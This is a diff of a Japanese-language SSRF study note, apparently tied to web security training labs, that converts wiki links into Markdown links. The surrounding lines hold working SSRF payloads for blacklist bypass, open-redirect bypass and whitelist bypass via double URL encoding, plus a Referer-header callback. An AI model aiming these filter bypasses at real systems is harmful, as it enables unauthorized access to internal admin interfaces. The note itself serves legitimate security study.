@@ -11,13 +11,13 @@ stockApi=http://192.168.0.x:6566/admin
 ```http
 stockApi=http://127.1:6566/AdMiN/
 ```
-- [[2.  一般的なSSRF防御の回避#SSRF ブラックリスト回避]]
+- [2.  一般的なSSRF防御の回避](2.%20%20一般的なSSRF防御の回避.md#SSRF%20ブラックリスト回避)
 
 ###### Open redirect脆弱性を使用したフィルタのバイパス
 ```http
 stockApi=/product/nextProduct?currentProductId=2<@urlencode>&path=<@/urlencode>http://192.168.0.x:6566/admin
 ```
-- [[2.  一般的なSSRF防御の回避#Open redirectによるSSRFフィルタのバイパス]]
+- [2.  一般的なSSRF防御の回避](2.%20%20一般的なSSRF防御の回避.md#Open%20redirectによるSSRFフィルタのバイパス)
 
 ---
 #### & XXE
@@ -32,7 +32,7 @@ stockApi=/product/nextProduct?currentProductId=2<@urlencode>&path=<@/urlencode>h
 </stockCheck>
 ```
 2. エラーレスポンスの情報にファイル名などが表示されたら、それをペイロードに加えてさらに探索を続ける
-	- 詳細：[[2. XXE攻撃によるファイル取得とSSRF攻撃#XXEによるSSRF攻撃の実行]]
+	- 詳細：[2. XXE攻撃によるファイル取得とSSRF攻撃](../XXE%20injection/2.%20XXE攻撃によるファイル取得とSSRF攻撃.md#XXEによるSSRF攻撃の実行)
 
 ---
 #### Routing based
@@ -44,7 +44,7 @@ Referer: http://COLLABOLATOR-DOMAIN
 ---
 #### &OpenID
 
-- [[3. OpenID Connectとその脆弱性#Unprotected dynamic client registration(動的クライアント登録の未保護)]]
+- [3. OpenID Connectとその脆弱性](../../Advanced/OAuth/3.%20OpenID%20Connectとその脆弱性.md#Unprotected%20dynamic%20client%20registration(動的クライアント登録の未保護))
 
 ---
 #### Advanced
@@ -53,7 +53,7 @@ Referer: http://COLLABOLATOR-DOMAIN
 ```http
 stockApi=http://localhost:6566<@urlencode><@urlencode>#<@/urlencode><@/urlencode>@stock.weliketoshop.net/admin/
 ```
-- [[2.  一般的なSSRF防御の回避#SSRF ホワイトリスト回避]]
+- [2.  一般的なSSRF防御の回避](2.%20%20一般的なSSRF防御の回避.md#SSRF%20ホワイトリスト回避)
 
 
 ###### Admin panel - Download report as PDF SSRF
